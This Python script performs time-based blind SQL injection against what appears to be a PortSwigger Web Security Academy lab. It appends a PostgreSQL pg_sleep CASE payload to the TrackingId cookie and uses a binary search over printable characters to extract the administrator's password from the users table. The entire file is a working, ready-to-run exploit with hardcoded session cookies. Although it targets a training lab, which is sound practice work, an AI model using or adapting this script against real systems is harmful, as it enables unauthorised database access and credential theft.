import requests
import string
import time

url = 'https://0a470073033733608198d41900cd006e.web-security-academy.net/'

cookies = {
    'session': 'SqO7AYuQRRQjsnzuCY0MrFSyYX0iNKvd',
    'TrackingId': '1p9u4nx1wluhoqHl'  # Base TrackingId, injection will be added
}

charset = ''.join([chr(i) for i in range(32, 127)])  # Full printable ASCII

#def send_request(injection):
 #   full_cookie = cookies.copy()
  #  full_cookie['TrackingId'] += injection
   # print(full_cookie['TrackingId'])
    #r = requests.get(url, cookies=full_cookie, verify=False)
    #return r.status_code != 500  # True if no error (condition FALSE), False if error (condition TRUE)

def send_request(injection):
    full_cookie = cookies.copy()
    full_cookie['TrackingId'] += injection
    headers = {'User-Agent': 'Mozilla/5.0'}

    try:
        start = time.time()
        r = requests.get(url, cookies=full_cookie, headers=headers, verify=False, timeout=10)
        end = time.time()
        
        duration = end - start
        print(f"[DEBUG] Status: {r.status_code} | Response Time: {duration:.2f}s")

        return duration > 1.99  # Adjust threshold as needed (e.g., 5s sleep => ~4.5s+ is "true")

    except requests.exceptions.Timeout:
        print("[-] Request timed out!")
        return True  # Consider timeout as likely true (long delay)

    except Exception as e:
        print(f"[!] Request error: {e}")
        return False


def binary_search_char_at_pos(pos):
    low = 0
    high = len(charset) - 1

    while low <= high:
        mid = (low + high) // 2
        mid_char = charset[mid]

        injection = f"' || (SELECT CASE WHEN substr(password,{pos},1) >= '{mid_char}' THEN pg_sleep(2) ELSE '' END FROM users WHERE username='administrator') || '"
        success = send_request(injection)

        if success:  # Error means condition TRUE → go higher
            low = mid + 1
        else:
            high = mid - 1

    return charset[high]


def main():
    password = ''
    for i in range(1, 21):  # Positions 1 to 20
        print(f"[*] Finding character at position {i}...")
        char = binary_search_char_at_pos(i)
        password += char
        print(f"[+] Found: {char} --> Password so far: {password}")

    print(f"[✓] Final password: {password}")

if __name__ == '__main__':
    main()
